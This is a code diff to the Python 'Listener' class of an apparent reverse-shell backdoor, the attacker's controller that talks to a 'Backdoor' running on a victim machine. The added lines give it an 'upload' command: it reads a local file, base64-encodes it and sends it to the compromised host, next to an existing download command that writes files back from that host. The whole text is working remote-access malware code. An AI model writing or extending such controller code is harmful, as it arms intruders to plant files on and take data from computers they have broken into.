@@ -45,11 +45,24 @@ class Listener:
             file.write(base64.b64decode(content))  # Decoding content encoded in Backdoor.read_file()
             return "[+] Download successful"
 
+    # Read file as binary
+    def read_file(self, path):
+        with open(path, "rb") as file:  # "rb" stands for read binary
+            # Encode the data in base64 to manage all file's types
+            # by encapsulating all special characters
+            return base64.b64encode(file.read())
+
     # Take input
     def run(self):
         while True:
             command = raw_input(">> ")
             command = command.split(" ")  # Take command as an array
+
+            # Reverse command upload
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)  # Add file content to the send data
+
             result = self.execute_remotely(command)
 
             # Reverse command download
